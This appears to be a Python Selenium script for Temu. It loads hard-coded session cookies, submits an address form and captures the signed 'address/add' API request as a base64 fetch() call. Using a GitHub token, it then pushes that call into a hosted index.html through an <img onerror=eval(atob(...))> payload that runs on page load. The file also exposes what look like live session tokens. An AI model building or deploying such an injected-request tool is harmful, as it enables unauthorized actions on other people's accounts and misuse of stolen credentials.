import threading
import time
import json
import base64
import requests
import re
import sys
import os
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager

# ---- CONFIG FROM ENV ----
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
OWNER = "dasdsa0d8s9a"
REPO = "dsadsadsadsadasdsa"
FILE_PATH = "index.html"
BRANCH = "main"
COMMIT_MESSAGE = "Auto-update code constant"

# ---- SELENIUM & FETCH CONFIG ----
cookies_str = """region=135;timezone=Africa%2FCasablanca;_hal_tag=AJz8+kNyYqt43dHVad+/k+iT+be/3efHoIsIXJW5sjlJqcyhP+8jgU/Uv41VB+Ca3A==;api_uid=CnAoNGld4q6zMR7QDlOBAg==;language=en;currency=MAD;__cf_bm=YIbjGksmOt5QyGetVWKpmiPkbLllj_2kkcMyh_ecEpM-1768491657-1.0.1.1-Efs_S2VzypbSNaBZMM2ApOu6klxe_m.CxxXw1.Bvqaoaz2HLh7gLDsCAhlFebKFpYnD1cM4jgdtZf0r65jD9BbkigkSQX4bekCBqM2tyaQM;_bee=VuhjABOWgOza6PnveMRpRBlnuAfcNhlz;_nano_fp=GVL18b-t8bLYqDr1cJLSw#ZjPEAnA0FrRTwgkPRf6nK;_ttc=3.INyd00PyRXeE.1799296569;AccessToken=AA24UTAI3NUYIOPKNRACV4HG4ZXS3ZCE5AGHFL2TSJLID65GNNTQ0110872ba99a;dilx=1w1B-_vEzgtm75UTmek5;hfsc=L3yMf4426Tv+15PNfQ==;img_sup=avif%2Cwebp;isLogin=1768167527576;njrpl=VuhjABOWgOza6PnveMRpRBlnuAfcNhlz;user_uin=BBBJWWX4FKB7OMKNMY36MKDDDNA5DR4TYUJ7LQP6;verifyAuthToken=DlqFpTAWfQ8Wnj43CH3V9A0a646c09b651ccc19"""
url = "https://www.temu.com/create_address.html"
TARGET_FETCH_URL = "https://www.temu.com/api/bg-origenes/address/add"

def update_github_file_with_base64(base64_payload: str):
    print("\n--- Background GitHub Update Started ---")
    if not GITHUB_TOKEN:
        print("[ERROR] GitHub Token is missing from Environment Variables.")
        return

    try:
        api_url = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{FILE_PATH}"
        headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
        
        r_get = requests.get(api_url, headers=headers, params={"ref": BRANCH}, timeout=30)
        r_get.raise_for_status()
        file_data = r_get.json()
        sha = file_data["sha"]

        content_str = (file_data.get("content") or "").replace("\n", "").strip()
        old_text = base64.b64decode(content_str.encode("utf-8")).decode("utf-8", errors="replace")

        pattern = r"(<img\s+src=x\s+onerror=eval\(atob\(')([^']+)('\)\))"
        updated_text, count = re.subn(pattern, rf"\g<1>{base64_payload}\g<3>", old_text, count=1)
        
        if count == 0:
            print("[GitHub ERROR] Could not find placeholder pattern.")
            return

        new_content_b64 = base64.b64encode(updated_text.encode("utf-8")).decode("utf-8")
        put_payload = {"message": COMMIT_MESSAGE, "content": new_content_b64, "sha": sha, "branch": BRANCH}
        r_put = requests.put(api_url, headers=headers, json=put_payload, timeout=30)
        r_put.raise_for_status()
        print(f"[GitHub SUCCESS] Updated {FILE_PATH}.")

    except Exception as e:
        print(f"[GitHub FATAL ERROR] {e}")

def generate_fetch_code() -> str:
    print("--- Phase 1: Generating Fetch Payload via Headed Emulation ---")
    chrome_options = Options()
    # DO NOT use --headless. We use xvfb-run to provide the UI display.
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

    # Auto-fix for Driver Version mismatch
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    
    base64_encoded_fetch = ""
    try:
        print("  [Step 1] Setting cookies and navigating...")
        driver.get(url)
        for cookie_pair in cookies_str.split(';'):
            if '=' in cookie_pair:
                name, value = cookie_pair.split('=', 1)
                driver.add_cookie({'name': name.strip(), 'value': value.strip(), 'domain': '.temu.com'})
        driver.refresh()

        print("  [Step 2] Filling address form...")
        # Wait for form
        WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, "//input[@aria-label='Last Name']")))
        driver.find_element(By.XPATH, "//input[@aria-label='Last Name']").send_keys("Doe")
        driver.find_element(By.XPATH, "//input[contains(@aria-label, 'First Name')]").send_keys("John")
        driver.find_element(By.XPATH, "//input[@aria-label='Street address Street, building/apartment number, district etc']").send_keys("123 Main St")
        
        phone_input = driver.find_element(By.XPATH, "//input[@placeholder='Enter a 9-digit number']")
        phone_input.clear()
        phone_input.send_keys("770893233")

        print("  [Step 3] Clicking 'Save' using JavaScript...")
        # Scroll to button and click via JS (most reliable for CI)
        save_button = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(., 'Save') and @role='button']"))
        )
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", save_button)
        time.sleep(1)
        driver.execute_script("arguments[0].click();", save_button)
        
        print("  [Step 4] Waiting 15 seconds for network logs...")
        time.sleep(15)
        
        logs = driver.get_log('performance')
        for entry in logs:
            log = json.loads(entry['message'])['message']
            if log['method'] == 'Network.requestWillBeSent':
                request = log['params']['request']
                # Search for any request that matches the Temu API endpoint
                if "api/bg-origenes/address/add" in request['url']:
                    print(f"  [SUCCESS] Found target fetch request: {request['url']}")
                    fetch_cmd = f"fetch('{request['url']}', {{ method: '{request['method']}', headers: {json.dumps(request['headers'])} }});"
                    base64_encoded_fetch = base64.b64encode(fetch_cmd.encode('utf-8')).decode('utf-8')
                    break
        
        if not base64_encoded_fetch:
            print("  [ERROR] Target URL not found in network logs.")

    except Exception as e:
        print(f"\n[FATAL ERROR] Selenium Phase: {e}")
        traceback.print_exc()
    finally:
        driver.quit()
        print("--- Selenium Phase Finished ---")
    return base64_encoded_fetch

def main():
    new_base64_code = generate_fetch_code()
    if new_base64_code:
        print("\n--- Phase 2: Updating GitHub ---")
        update_github_file_with_base64(new_base64_code)
        return 0
    else:
        print("\n[ERROR] No payload generated. Script failed.")
        return 1

if __name__ == "__main__":
    sys.exit(main())
